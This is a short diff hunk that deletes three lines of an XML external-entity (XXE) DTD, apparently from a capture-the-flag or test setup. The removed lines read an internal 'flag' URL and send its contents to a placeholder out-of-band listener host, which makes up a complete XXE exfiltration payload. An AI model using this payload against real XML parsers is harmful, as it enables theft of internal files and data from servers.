@@ -1,3 +1,0 @@
-<!ENTITY % file SYSTEM "http://127.0.0.1:2580/flag">
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://oob_listener.domain.tld/%file;'>">
-%all;
